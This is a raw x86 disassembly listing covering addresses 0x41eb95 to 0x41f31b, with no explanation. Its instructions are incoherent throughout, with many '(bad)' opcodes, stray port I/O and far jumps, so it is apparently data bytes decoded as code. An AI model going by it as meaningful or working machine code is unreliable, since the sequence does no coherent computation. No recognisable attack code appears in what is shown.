  41eb95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb96:	cmp    al,0xe7
  41eb98:	xor    esi,esp
  41eb9a:	lods   eax,DWORD PTR ds:[esi]
  41eb9b:	fdiv   st,st(4)
  41eb9d:	mov    edx,0xf68780d4
  41eba2:	mov    eax,ds:0xad056ef6
  41eba7:	add    al,0x23
  41eba9:	add    eax,0x608713f6
  41ebae:	adc    al,0xc5
  41ebb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebb1:	aad    0xc3
  41ebb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebb4:	push   edi
  41ebb5:	push   ds
  41ebb6:	shr    BYTE PTR [esi+0x43],cl
  41ebb9:	in     al,dx
  41ebba:	mov    cl,0x65
  41ebbc:	mov    eax,ds:0xc13f484a
  41ebc1:	data16 jecxz 0x41eb62
  41ebc4:	cli    
  41ebc5:	add    eax,0x9a67b212
  41ebca:	or     al,0x16
  41ebcc:	dec    esp
  41ebcd:	pop    es
  41ebce:	ds jae 0x41ec14
  41ebd1:	lods   eax,DWORD PTR ds:[esi]
  41ebd2:	repnz pop ds
  41ebd4:	inc    ecx
  41ebd5:	add    al,0xbe
  41ebd7:	sub    DWORD PTR [eax],ebp
  41ebd9:	outs   dx,DWORD PTR gs:[esi]
  41ebdb:	push   edx
  41ebdc:	dec    bh
  41ebde:	sbb    eax,0xc8be798d
  41ebe3:	mov    bh,0xf4
  41ebe5:	add    eax,0x28532ab0
  41ebea:	jae    0x41ec29
  41ebec:	scas   eax,DWORD PTR es:[edi]
  41ebed:	(bad)  
  41ebee:	fcmovne st,st(1)
  41ebf0:	mov    dl,0x86
  41ebf2:	xchg   ebp,eax
  41ebf3:	xchg   BYTE PTR [ecx+eiz*8+0x38bc50b1],bh
  41ebfa:	cmp    al,0xb
  41ebfc:	pop    es
  41ebfd:	push   edx
  41ebfe:	addr16 (bad) 
  41ec00:	in     eax,dx
  41ec01:	cmp    eax,DWORD PTR [eax]
  41ec03:	clc    
  41ec04:	retf   0x78e2
  41ec07:	and    BYTE PTR [ecx],al
  41ec09:	cmp    eax,0xc6b0b189
  41ec0e:	or     ah,dh
  41ec10:	or     bh,BYTE PTR [edx-0x90042d7]
  41ec16:	nop
  41ec17:	imul   edx,DWORD PTR [eax],0x5e
  41ec1a:	adc    BYTE PTR [eax+ebp*2+0x3e38c8bb],0x63
  41ec22:	inc    eax
  41ec23:	inc    esp
  41ec24:	sbb    al,0xd1
  41ec26:	(bad)  
  41ec28:	test   esp,eax
  41ec2a:	loope  0x41ec88
  41ec2c:	jb     0x41ec05
  41ec2e:	mov    cl,0x0
	...
  41ec38:	add    BYTE PTR [eax],al
  41ec3a:	add    ah,dh
  41ec3c:	mov    dl,0x32
  41ec3e:	(bad)  
  41ec3f:	jbe    0x41ec17
  41ec41:	hlt    
  41ec42:	mov    dl,0xb1
  41ec44:	and    al,0xfe
  41ec46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec47:	pop    ebp
  41ec48:	enter  0x136c,0x17
  41ec4c:	pop    DWORD PTR [ecx]
  41ec4e:	add    BYTE PTR [eax+eax*1+0x273a0000],ch
  41ec55:	xor    esp,edi
  41ec57:	in     al,0xff
  41ec59:	cmc    
  41ec5a:	mov    ecx,0xd25f1683
  41ec5f:	lods   eax,DWORD PTR cs:[esi]
  41ec61:	rcl    BYTE PTR [ebx-0x49],1
  41ec64:	enter  0x33c0,0x6b
  41ec68:	sub    DWORD PTR [edi-0x3d2edf72],edx
  41ec6e:	ret    
  41ec6f:	add    DWORD PTR [esi],esp
  41ec71:	in     al,dx
  41ec72:	loopne 0x41ec01
  41ec74:	popf   
  41ec75:	push   ds
  41ec76:	fs or  bh,bl
  41ec79:	fisttp WORD PTR [edx]
  41ec7b:	jecxz  0x41ec72
  41ec7d:	test   BYTE PTR [esi],al
  41ec7f:	xor    eax,0xfec61adb
  41ec84:	jnp    0x41ec0d
  41ec86:	(bad)  
  41ec87:	es push ecx
  41ec89:	inc    edx
  41ec8a:	inc    esi
  41ec8b:	mov    ch,0x24
  41ec8d:	add    DWORD PTR [edx-0x592656bf],0x5d
  41ec94:	mov    al,0x9f
  41ec96:	inc    ebp
  41ec97:	mov    esi,ecx
  41ec99:	xlat   BYTE PTR ds:[ebx]
  41ec9a:	cmp    DWORD PTR [ebp+0x62],ebp
  41ec9d:	and    DWORD PTR [ecx+ebp*4],ebp
  41eca0:	leave  
  41eca1:	jbe    0x41ecb7
  41eca3:	dec    edi
  41eca4:	shr    edi,0x9e
  41eca7:	sbb    BYTE PTR [ecx-0x5dfac34],cl
  41ecad:	stos   DWORD PTR es:[edi],eax
  41ecae:	sub    al,0xc2
  41ecb0:	pusha  
  41ecb1:	inc    esp
  41ecb2:	fimul  DWORD PTR [ecx]
  41ecb4:	js     0x41ec36
  41ecb6:	test   al,0xa8
  41ecb8:	jmp    0x8c4f:0x1b4d869c
  41ecbf:	dec    ebx
  41ecc0:	mov    edx,0xe116a147
  41ecc5:	call   0x32146017
  41ecca:	loopne 0x41ed0d
  41eccc:	in     al,dx
  41eccd:	add    al,0xba
  41eccf:	and    DWORD PTR [eax],esp
  41ecd1:	jle    0x41ed35
  41ecd3:	add    DWORD PTR [ebx-0x27ad2900],edx
  41ecd9:	sbb    edi,esp
  41ecdb:	scas   al,BYTE PTR es:[edi]
  41ecdc:	cld    
  41ecdd:	enter  0x1741,0x5b
  41ece1:	xlat   BYTE PTR ds:[ebx]
  41ece2:	xor    eax,0x9a4e172c
  41ece7:	out    0x79,al
  41ece9:	xchg   esi,eax
  41ecea:	dec    edx
  41eceb:	sub    bh,cl
  41eced:	shl    DWORD PTR [esi+0x68],0xb2
  41ecf1:	test   al,0xe5
  41ecf3:	cmp    edx,edx
  41ecf5:	pop    ds
  41ecf6:	sbb    DWORD PTR [ebx-0x5349354f],0xffffffa8
  41ecfd:	ret    0x55
	...
  41ed08:	add    BYTE PTR [eax],al
  41ed0a:	add    BYTE PTR [edx],dh
  41ed0c:	ror    esi,cl
  41ed0e:	mov    ds:0xd37ebfef,al
  41ed13:	sub    edi,DWORD PTR [esi]
  41ed15:	out    0x3f,eax
  41ed17:	out    0x12,al
  41ed19:	mov    eax,0x18fc389
  41ed1e:	add    BYTE PTR [eax+eax*1+0x68430000],ch
  41ed25:	int3   
  41ed26:	mov    ecx,0xf8bb8c01
  41ed2b:	arpl   si,bx
  41ed2d:	test   al,0x8a
  41ed2f:	jmp    0x3b09c22f
  41ed34:	(bad)  
  41ed35:	mov    dl,0x85
  41ed37:	xchg   esi,eax
  41ed38:	add    eax,0x85cf84ae
  41ed3d:	push   0x3cc81e
  41ed42:	fs jl  0x8a4eca30
  41ed49:	jns    0x41edc4
  41ed4b:	icebp  
  41ed4c:	cmp    edi,esp
  41ed4e:	loope  0x41ed92
  41ed50:	icebp  
  41ed51:	ss dec esp
  41ed53:	int    0xfa
  41ed55:	(bad)  
  41ed56:	sti    
  41ed57:	ins    BYTE PTR es:[edi],dx
  41ed58:	aaa    
  41ed59:	popf   
  41ed5a:	call   0x869d:0xc95ee809
  41ed61:	push   edx
  41ed62:	repnz or ebx,edi
  41ed65:	sub    DWORD PTR [eax-0x2c],esp
  41ed68:	repz scas al,BYTE PTR es:[edi]
  41ed6a:	mov    eax,ds:0xeb7d2318
  41ed6f:	cli    
  41ed70:	mov    ds:0xa3bdf56d,eax
  41ed75:	cmc    
  41ed76:	retf   0xa53f
  41ed79:	not    BYTE PTR [esi]
  41ed7b:	enter  0x1b9a,0xf3
  41ed7f:	ds cmp eax,0xbb614601
  41ed85:	(bad)  
  41ed87:	jecxz  0x41ed2d
  41ed89:	xor    ebx,edi
  41ed8b:	push   eax
  41ed8c:	aad    0x53
  41ed8e:	jb     0x41ed9f
  41ed90:	inc    ebx
  41ed91:	jnp    0x41ed54
  41ed93:	cmp    al,0x29
  41ed95:	fwait
  41ed96:	jecxz  0x41ed8c
  41ed98:	enter  0x5bbf,0x12
  41ed9c:	nop
  41ed9d:	sahf   
  41ed9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed9f:	icebp  
  41eda0:	xchg   ecx,eax
  41eda1:	leave  
  41eda2:	and    DWORD PTR [edi+0x60fdd465],eax
  41eda8:	mov    cl,0xaa
  41edaa:	(bad)  
  41edab:	jecxz  0x41edfd
  41edad:	xchg   esp,eax
  41edae:	cmp    BYTE PTR [ebx],al
  41edb0:	pusha  
  41edb1:	or     eax,0x65b9a79b
  41edb6:	jae    0x41ed61
  41edb8:	sub    al,0x21
  41edba:	mov    dl,0x67
  41edbc:	nop
  41edbd:	test   eax,0x3250a9a8
  41edc2:	fsubr  DWORD PTR [ecx+0x5405d98f]
  41edc8:	ss sub eax,0xd19c11ce
  41edce:	and    DWORD PTR [eax],eax
	...
  41edd8:	add    BYTE PTR [eax],al
  41edda:	add    bl,bl
  41eddc:	in     eax,dx
  41eddd:	outs   dx,BYTE PTR ds:[esi]
  41edde:	and    bh,BYTE PTR [esi-0x5d]
  41ede1:	(bad)  
  41ede3:	pop    esi
  41ede4:	(bad)  
  41ede5:	mov    DWORD PTR [ebp-0x1ffca33e],ecx
  41edeb:	outs   dx,DWORD PTR ds:[esi]
  41edec:	nop
  41eded:	add    DWORD PTR [eax],eax
  41edef:	lods   al,BYTE PTR ds:[esi]
  41edf0:	add    BYTE PTR [eax],al
  41edf2:	add    cl,cl
  41edf4:	fadd   st(0),st
  41edf6:	jmp    0xf04b86eb
  41edfb:	imul   BYTE PTR [eax+eiz*4+0x79288ec7]
  41ee02:	or     edx,DWORD PTR [eax+0x74823ff4]
  41ee08:	pop    ds
  41ee09:	mov    eax,0x78f8dccb
  41ee0e:	mov    cs,ebp
  41ee10:	xchg   edi,esp
  41ee12:	jnp    0x41ee63
  41ee14:	jnp    0x41ee66
  41ee16:	adc    BYTE PTR [edx],al
  41ee18:	cmp    dh,al
  41ee1a:	jecxz  0x41edbd
  41ee1c:	sbb    edx,DWORD PTR [ebx-0x45]
  41ee1f:	leave  
  41ee20:	sub    dl,bl
  41ee22:	scas   eax,DWORD PTR es:[edi]
  41ee23:	mov    ebx,ss
  41ee25:	or     BYTE PTR [ebx-0x52],0x8b
  41ee29:	and    ebp,DWORD PTR [esp+edx*2]
  41ee2c:	push   0xa422875c
  41ee31:	dec    ebx
  41ee32:	mov    cl,BYTE PTR [edx+0x3203940f]
  41ee38:	call   0x97bdade2
  41ee3d:	ds aas 
  41ee3f:	iret   
  41ee40:	nop
  41ee41:	shl    bl,0x81
  41ee44:	lods   eax,DWORD PTR ds:[esi]
  41ee45:	adc    al,0x76
  41ee47:	dec    edi
  41ee48:	cmp    DWORD PTR [esi-0x23e8aaee],ebx
  41ee4e:	aam    0xb9
  41ee50:	sbb    DWORD PTR [eax+0x4e],edi
  41ee53:	jne    0x41ee38
  41ee55:	rcr    BYTE PTR [ecx],cl
  41ee57:	dec    ebx
  41ee58:	je     0x41eecf
  41ee5a:	fst    st(1)
  41ee5c:	jmp    0x5c58:0x17732a48
  41ee63:	push   ds
  41ee64:	jbe    0x41eee5
  41ee66:	push   ebp
  41ee67:	das    
  41ee68:	cwde   
  41ee69:	aas    
  41ee6a:	or     al,0xff
  41ee6c:	inc    edx
  41ee6d:	mov    ebx,0xd9289baa
  41ee72:	adc    bh,dl
  41ee74:	and    eax,0xee77a212
  41ee79:	aas    
  41ee7a:	mov    ds,WORD PTR [edx-0x80]
  41ee7d:	dec    ebx
  41ee7e:	pop    edx
  41ee7f:	push   edi
  41ee80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee81:	jge    0x41eef5
  41ee83:	rcl    BYTE PTR [edi],0x76
  41ee86:	les    edx,FWORD PTR [edx-0xe6c7fdf]
  41ee8c:	lds    ecx,FWORD PTR [ecx]
  41ee8e:	mov    cl,BYTE PTR [eax+0x247114db]
  41ee94:	mov    bl,0x47
  41ee96:	(bad)  
  41ee97:	out    dx,eax
  41ee98:	xchg   bh,cl
  41ee9a:	xchg   ebp,eax
  41ee9b:	js     0x41eeb3
  41ee9d:	lea    edi,[eax+0x0]
	...
  41eea8:	add    BYTE PTR [eax],al
  41eeaa:	add    BYTE PTR ds:0x6f976b22,al
  41eeb0:	(bad)  
  41eeb2:	mov    dl,0x66
  41eeb4:	and    BYTE PTR [esi-0x78fe3696],ah
  41eeba:	mov    al,0x1b
  41eebc:	xchg   ecx,eax
  41eebd:	add    DWORD PTR [eax],eax
  41eebf:	lods   al,BYTE PTR ds:[esi]
  41eec0:	add    BYTE PTR [eax],al
  41eec2:	add    bl,cl
  41eec4:	addr16 mov al,0x2a
  41eec7:	fs (bad) 
  41eec9:	fst    st(2)
  41eecb:	stc    
  41eecc:	pop    ds
  41eecd:	mov    ds:0x35245aff,al
  41eed2:	pop    ebp
  41eed3:	sahf   
  41eed4:	sbb    DWORD PTR [edi+0x62d1ca5f],edi
  41eeda:	fnsave [ecx+0x63c368f1]
  41eee0:	call   0x98ee:0x5ddbfe4c
  41eee7:	mov    ebx,0xdb0cf8d4
  41eeec:	and    ah,al
  41eeee:	jae    0x41ee7d
  41eef0:	mul    DWORD PTR [ebx+0x1f9b5a1e]
  41eef6:	aad    0x7a
  41eef8:	inc    esi
  41eef9:	stc    
  41eefa:	call   FWORD PTR [esi]
  41eefc:	(bad)  
  41eefd:	cli    
  41eefe:	mov    ?,WORD PTR [edi-0x3c]
  41ef01:	mov    eax,ds:0xe35208b7
  41ef06:	jg     0x41ef11
  41ef08:	aas    
  41ef09:	loope  0x41ef80
  41ef0b:	jae    0x41eed1
  41ef0d:	push   esp
  41ef0e:	lea    esp,[ebx-0x3e]
  41ef11:	mov    bl,0xa8
  41ef13:	lea    ebp,[eax-0x6de3c5d9]
  41ef19:	out    0xa8,al
  41ef1b:	xchg   edi,eax
  41ef1c:	sti    
  41ef1d:	push   es
  41ef1e:	cmp    esi,DWORD PTR [eax+0x31]
  41ef21:	test   al,0xda
  41ef23:	adc    eax,0xc5aadd5d
  41ef28:	out    dx,eax
  41ef29:	push   esp
  41ef2a:	mov    eax,ds:0xbbeb42a0
  41ef2f:	cli    
  41ef30:	gs sbb al,0xbe
  41ef33:	adc    esi,DWORD PTR [ecx-0x50]
  41ef36:	fs sbb ch,dh
  41ef39:	push   ebx
  41ef3a:	jmp    0x83c3:0x95e68c1d
  41ef41:	mov    edx,0xedd6d8d4
  41ef46:	jmp    0x3549:0xfd163d83
  41ef4d:	(bad)  
  41ef4e:	sbb    BYTE PTR [ecx-0x2f5a66e4],cl
  41ef54:	dec    edx
  41ef55:	sbb    DWORD PTR [edi],esi
  41ef57:	pop    edx
  41ef58:	fisubr DWORD PTR [esi+edi*1+0x20]
  41ef5c:	inc    ebx
  41ef5d:	push   0x2b
  41ef5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef60:	enter  0x9b0e,0xaa
  41ef64:	ret    
  41ef65:	push   cs
  41ef66:	cmp    eax,0xf45406b0
  41ef6b:	ins    DWORD PTR es:[edi],dx
  41ef6c:	inc    edx
  41ef6d:	cmp    BYTE PTR [eax+0x0],0x0
  41ef74:	add    BYTE PTR [eax],al
  41ef76:	add    BYTE PTR [eax],al
  41ef78:	add    BYTE PTR [eax],al
  41ef7a:	add    BYTE PTR [ebx+0x7fd924d4],cl
  41ef80:	stc    
  41ef81:	call   esi
  41ef83:	into   
  41ef84:	inc    ebp
  41ef85:	mov    bh,0x11
  41ef87:	out    dx,al
  41ef88:	popf   
  41ef89:	fisub  DWORD PTR [edi+eax*8-0x6f]
  41ef8d:	add    DWORD PTR [eax],eax
  41ef8f:	lods   al,BYTE PTR ds:[esi]
  41ef90:	add    BYTE PTR [eax],al
  41ef92:	add    dl,dh
  41ef94:	iret   
  41ef95:	mov    ecx,0x4ae5c898
  41ef9a:	xor    ebx,DWORD PTR [esi+ecx*2+0xaab5eb6]
  41efa1:	mov    al,0x88
  41efa3:	std    
  41efa4:	stos   BYTE PTR es:[edi],al
  41efa5:	add    esi,ecx
  41efa7:	xchg   edx,eax
  41efa8:	push   ds
  41efa9:	add    DWORD PTR [eax],0x593ed24
  41efaf:	mov    dl,0xc0
  41efb1:	mov    eax,ds:0x78607562
  41efb6:	in     eax,0x66
  41efb8:	inc    edi
  41efb9:	sahf   
  41efba:	xlat   BYTE PTR ds:[ebx]
  41efbb:	sub    BYTE PTR [edx+0x6004c160],0xb7
  41efc2:	and    al,0xf1
  41efc4:	(bad)  
  41efc5:	mov    ecx,0x68f4a5b6
  41efca:	out    0x45,eax
  41efcc:	sbb    al,0xbe
  41efce:	xchg   ecx,eax
  41efcf:	inc    edx
  41efd0:	jl     0x41efc1
  41efd2:	test   al,0x7f
  41efd4:	and    eax,0xfc67de21
  41efd9:	lods   al,BYTE PTR ds:[esi]
  41efda:	jmp    0x704e1945
  41efdf:	cmp    ch,bl
  41efe1:	push   ds
  41efe2:	int    0x9a
  41efe4:	dec    edx
  41efe5:	jle    0x41efc7
  41efe7:	dec    esi
  41efe8:	xor    BYTE PTR [ebx-0x22f38f4e],bl
  41efee:	mov    eax,ds:0x60dc5d25
  41eff3:	mov    bh,0x3a
  41eff5:	int3   
  41eff6:	jp     0x41f051
  41eff8:	loope  0x41f01b
  41effa:	mov    bl,0x66
  41effc:	push   0xffffffa6
  41effe:	into   
  41efff:	or     dh,al
  41f001:	or     BYTE PTR [ebx-0x6e],al
  41f004:	push   ss
  41f005:	and    ebp,DWORD PTR ss:[edi+0x20]
  41f009:	push   esp
  41f00a:	das    
  41f00b:	or     edi,DWORD PTR [esi+0x0]
  41f00e:	xchg   edx,eax
  41f00f:	mov    edx,fs
  41f011:	jne    0x41f079
  41f013:	ins    DWORD PTR es:[edi],dx
  41f014:	push   ebp
  41f015:	xor    al,0x88
  41f017:	push   edx
  41f018:	sub    DWORD PTR [edi+0xf],ecx
  41f01b:	cmp    bh,ch
  41f01d:	or     esp,DWORD PTR [ecx]
  41f01f:	(bad)  
  41f020:	retf   0xb72f
  41f023:	stos   DWORD PTR es:[edi],eax
  41f024:	(bad)  
  41f025:	xor    eax,DWORD PTR ds:0x7c4bb359
  41f02b:	pop    ebp
  41f02c:	test   ah,ah
  41f02e:	adc    dh,bh
  41f030:	retf   0xf684
  41f033:	(bad)  
  41f035:	push   esp
  41f036:	das    
  41f037:	and    esp,DWORD PTR [eax+0x6994f813]
  41f03d:	sub    al,0xf3
	...
  41f04b:	fisubr WORD PTR [ecx]
  41f04d:	cwde   
  41f04e:	sar    bh,cl
  41f050:	repz fisubr WORD PTR ds:0x4af35f6
  41f057:	ror    dh,cl
  41f059:	sub    DWORD PTR [eax+0x19273],esi
  41f05f:	lods   al,BYTE PTR ds:[esi]
  41f060:	add    BYTE PTR [eax],al
  41f062:	add    BYTE PTR [ebp+ebx*1-0x6],cl
  41f066:	sti    
  41f067:	in     al,dx
  41f068:	dec    ecx
  41f069:	mov    eax,ds:0x7eff1dd0
  41f06e:	dec    edi
  41f06f:	pop    eax
  41f070:	xchg   ebx,eax
  41f071:	sbb    esi,DWORD PTR [edi+0x76]
  41f074:	(bad)  
  41f076:	xchg   ebx,eax
  41f077:	je     0x41f03c
  41f079:	pop    eax
  41f07a:	popa   
  41f07b:	in     eax,dx
  41f07c:	sti    
  41f07d:	inc    ebx
  41f07e:	xor    eax,0xc2e0a8ba
  41f083:	inc    eax
  41f084:	inc    edi
  41f085:	cld    
  41f086:	dec    esp
  41f087:	daa    
  41f088:	jmp    0xf0e2:0xe79c8d1a
  41f08f:	(bad)  
  41f090:	call   0x5e7e8c2b
  41f095:	fisubr DWORD PTR [ebp-0x44]
  41f098:	imul   edx,DWORD PTR ds:0x3f30987e,0xd161f2b6
  41f0a2:	dec    ebx
  41f0a3:	or     eax,DWORD PTR [eax+0x36c47a16]
  41f0a9:	das    
  41f0aa:	rcr    BYTE PTR [ecx-0x5c9c4454],0xc9
  41f0b1:	cmp    BYTE PTR [edx+0x6d],bh
  41f0b4:	lahf   
  41f0b5:	cmp    BYTE PTR [ebx+ecx*1],cl
  41f0b8:	pop    es
  41f0b9:	xchg   esi,eax
  41f0ba:	and    al,0x30
  41f0bc:	push   ebx
  41f0bd:	push   0x888b6ab5
  41f0c2:	push   edx
  41f0c3:	inc    ebp
  41f0c4:	in     eax,dx
  41f0c5:	dec    esi
  41f0c6:	xchg   esp,eax
  41f0c7:	mov    ch,0x74
  41f0c9:	add    cl,BYTE PTR [esi]
  41f0cb:	jg     0x41f076
  41f0cd:	iret   
  41f0ce:	es in  al,dx
  41f0d0:	adc    esp,DWORD PTR [eax+0x48]
  41f0d3:	lock mov eax,DWORD PTR es:[edx-0x4e36568f]
  41f0db:	mov    WORD PTR [ecx-0x7de21e6e],es
  41f0e1:	xlat   BYTE PTR ds:[ebx]
  41f0e2:	in     eax,dx
  41f0e3:	out    dx,eax
  41f0e4:	stc    
  41f0e5:	rol    DWORD PTR [edx+esi*2-0x5d],0xca
  41f0ea:	fwait
  41f0eb:	(bad)  
  41f0ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ed:	sahf   
  41f0ee:	mov    eax,ds:0x561f966e
  41f0f3:	or     eax,0x78caa102
  41f0f8:	xchg   BYTE PTR [ecx-0xd],dl
  41f0fb:	add    BYTE PTR [esi*8+0x77b83321],0x65
  41f103:	pop    esp
  41f104:	mov    ds:0x49413642,al
  41f109:	pop    ss
  41f10a:	ins    BYTE PTR es:[edi],dx
  41f10b:	(bad)  
  41f10c:	iret   
  41f10d:	fstp   DWORD PTR [eax+eax*1+0x0]
	...
  41f119:	add    BYTE PTR [eax],al
  41f11b:	dec    esi
  41f11c:	aas    
  41f11d:	int3   
  41f11e:	sbb    eax,0x7fdffffd
  41f123:	out    dx,eax
  41f124:	loopne 0x41f13c
  41f126:	lods   al,BYTE PTR ds:[esi]
  41f127:	add    DWORD PTR [edi-0x6ce090c9],0xac0001
  41f131:	add    BYTE PTR [eax],al
  41f133:	out    dx,al
  41f134:	sbb    DWORD PTR [ebp-0x43faca56],edx
  41f13a:	cmp    ah,BYTE PTR [ecx]
  41f13c:	sub    BYTE PTR [eax+eiz*1-0x11],0xa3
  41f141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f142:	jno    0x41f131
  41f144:	sbb    esp,DWORD PTR [edx]
  41f146:	mov    al,0x46
  41f148:	push   es
  41f149:	std    
  41f14a:	test   al,0x5e
  41f14c:	fstp   TBYTE PTR [ecx+0x4c5400b3]
  41f152:	jecxz  0x41f176
  41f154:	xchg   edi,eax
  41f155:	test   DWORD PTR [esi+0x6e],ebx
  41f158:	or     BYTE PTR [ecx+0x5a],al
  41f15b:	stos   BYTE PTR es:[edi],al
  41f15c:	and    DWORD PTR [ecx+eiz*2-0xd],edi
  41f160:	sbb    BYTE PTR [ebp+0x20],ah
  41f163:	add    al,BYTE PTR [edx-0x1f843b15]
  41f169:	leave  
  41f16a:	popf   
  41f16b:	pop    edx
  41f16c:	shl    DWORD PTR [edx],0x90
  41f16f:	inc    esi
  41f170:	lods   al,BYTE PTR ds:[esi]
  41f171:	and    eax,0x7424ccc3
  41f176:	int3   
  41f177:	fsubr  st,st(5)
  41f179:	std    
  41f17a:	dec    edi
  41f17b:	outs   dx,BYTE PTR ds:[esi]
  41f17c:	sbb    BYTE PTR ss:[ebp+0x607f55f6],0x23
  41f184:	mov    bh,0xcd
  41f186:	inc    edi
  41f187:	out    0xcc,al
  41f189:	jne    0x41f1e1
  41f18b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f18c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f18d:	or     al,0x29
  41f18f:	out    0x83,al
  41f191:	sub    eax,0xe49f1ffc
  41f196:	repz mov al,ss:0x4a73258c
  41f19d:	inc    esi
  41f19e:	test   eax,0x16b19891
  41f1a3:	scas   eax,DWORD PTR es:[edi]
  41f1a4:	leave  
  41f1a5:	xor    DWORD PTR [ebx],esi
  41f1a7:	out    0x3a,al
  41f1a9:	fistp  WORD PTR [eax+edx*8+0x3aa40ce9]
  41f1b0:	or     al,0x94
  41f1b2:	cwde   
  41f1b3:	sti    
  41f1b4:	retf   
  41f1b5:	ret    0x30bb
  41f1b8:	ja     0x41f14b
  41f1ba:	xor    bh,BYTE PTR [edx+edi*1]
  41f1bd:	jmp    FWORD PTR [edi-0x2d]
  41f1c0:	dec    edi
  41f1c1:	sbb    cl,BYTE PTR [eax-0x55]
  41f1c4:	iret   
  41f1c5:	in     al,dx
  41f1c6:	xor    ah,BYTE PTR [ebx-0xbfb06bd]
  41f1cc:	shl    DWORD PTR [esi+eax*8-0x51],cl
  41f1d0:	jl     0x41f168
  41f1d2:	mov    BYTE PTR [ebx],dl
  41f1d4:	mov    ecx,ebx
  41f1d6:	mov    esp,0xd7b117e1
  41f1db:	les    eax,FWORD PTR [ebx]
  41f1dd:	mov    ch,0x93
	...
  41f1eb:	push   ds
  41f1ec:	test   eax,0x7ff735f6
  41f1f1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1f7:	xchg   ecx,eax
  41f1f8:	mov    ch,0xe0
  41f1fa:	imul   ecx,ebx,0xac000193
  41f200:	add    BYTE PTR [eax],al
  41f202:	add    bl,al
  41f204:	nop
  41f205:	adc    BYTE PTR [ebx-0x2b],dh
  41f208:	mov    al,0xc0
  41f20a:	adc    BYTE PTR [ebp-0xaa30787],cl
  41f210:	adc    eax,0x838bad0d
  41f215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f216:	cmp    eax,0x6d7176d4
  41f21b:	adc    cl,al
  41f21d:	(bad)  
  41f21f:	mov    cl,0xf4
  41f221:	mov    ch,0xd9
  41f223:	mov    eax,ds:0xa6376cbd
  41f228:	push   ds
  41f229:	xchg   edi,eax
  41f22a:	sbb    edi,eax
  41f22c:	or     al,0x2f
  41f22e:	jp     0x41f26f
  41f230:	fisttp DWORD PTR [eax-0x3d]
  41f233:	scas   eax,DWORD PTR es:[edi]
  41f234:	jne    0x41f270
  41f236:	bnd jo 0x41f24b
  41f239:	test   DWORD PTR [ebp+0x7c9daad2],esi
  41f23f:	sti    
  41f240:	push   ds
  41f241:	leave  
  41f242:	dec    ebp
  41f243:	or     edi,DWORD PTR [edx-0x61c6b768]
  41f249:	lds    edi,FWORD PTR [esi+0x4c]
  41f24c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f24d:	or     BYTE PTR [edi-0x2dbda129],0x51
  41f254:	mov    al,0x31
  41f256:	std    
  41f257:	pop    ds
  41f258:	xchg   edx,eax
  41f259:	sahf   
  41f25a:	sti    
  41f25b:	inc    ebp
  41f25c:	add    al,0x56
  41f25e:	xchg   ecx,eax
  41f25f:	xchg   edx,eax
  41f260:	shr    BYTE PTR [ebx+ecx*2-0x7d],1
  41f264:	test   DWORD PTR [edi-0x1e],edi
  41f267:	popf   
  41f268:	mov    ah,0xc7
  41f26a:	jnp    0x41f2d7
  41f26c:	inc    edx
  41f26d:	push   es
  41f26e:	and    ebx,DWORD PTR [esi]
  41f270:	cli    
  41f271:	xor    dh,bl
  41f273:	loopne 0x41f2ab
  41f275:	xor    al,0x11
  41f277:	imul   esi,DWORD PTR [ebp+0x67],0xffffff85
  41f27b:	jne    0x41f2c9
  41f27d:	ja     0x41f2e6
  41f27f:	clc    
  41f280:	adc    edx,ebx
  41f282:	adc    eax,0xd4c0b5c2
  41f287:	ins    BYTE PTR es:[edi],dx
  41f288:	inc    ecx
  41f289:	push   eax
  41f28a:	cmp    DWORD PTR [esi],edx
  41f28c:	imul   ebx,edi,0x3b98a5a5
  41f292:	bound  eax,QWORD PTR [esi+0x58]
  41f295:	loop   0x41f2c2
  41f297:	jnp    0x41f232
  41f299:	(bad)  
  41f29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f29b:	push   ds
  41f29c:	sbb    al,0xca
  41f29e:	mov    esp,0x2a82ca13
  41f2a3:	lods   al,BYTE PTR ds:[esi]
  41f2a4:	clc    
  41f2a5:	mov    esi,0x330e39c4
  41f2aa:	js     0x41f236
  41f2ac:	adc    ch,BYTE PTR [ebx+0x73]
	...
  41f2bb:	fwait
  41f2bc:	loope  0x41f32b
  41f2be:	sub    eax,0xf7dbad7f
  41f2c3:	sar    BYTE PTR [ebx],cl
  41f2c5:	(bad)  
  41f2c6:	add    BYTE PTR [edi+0x77677c46],cl
  41f2cc:	xchg   esp,eax
  41f2cd:	add    DWORD PTR [eax],eax
  41f2cf:	lods   al,BYTE PTR ds:[esi]
  41f2d0:	add    BYTE PTR [eax],al
  41f2d2:	add    BYTE PTR [edx+0x3d],dh
  41f2d5:	clc    
  41f2d6:	call   0x442e6c50
  41f2db:	sbb    edi,DWORD PTR [esi+0x125baca2]
  41f2e1:	cmc    
  41f2e2:	in     al,dx
  41f2e3:	pop    esi
  41f2e4:	imul   esi,DWORD PTR [esi],0xd8335d88
  41f2ea:	xchg   ebx,eax
  41f2eb:	xchg   edi,eax
  41f2ec:	jb     0x41f314
  41f2ee:	adc    bl,BYTE PTR [eax+edx*1+0x69]
  41f2f2:	sub    ebx,edi
  41f2f4:	mov    bh,0x3
  41f2f6:	ss sbb al,0xbb
  41f2f9:	mov    esp,0xbbfc8e88
  41f2fe:	adc    ah,BYTE PTR ds:0x94c879c2
  41f304:	out    0x8,al
  41f306:	jmp    0x6c3b36d3
  41f30b:	jge    0x41f32f
  41f30d:	imul   eax,esi,0xffffff97
  41f310:	lds    ebp,FWORD PTR [ebp+0x3ff420f9]
  41f316:	inc    ebp
  41f317:	rcl    DWORD PTR [esi-0xc],0xeb
  41f31b:	hlt    
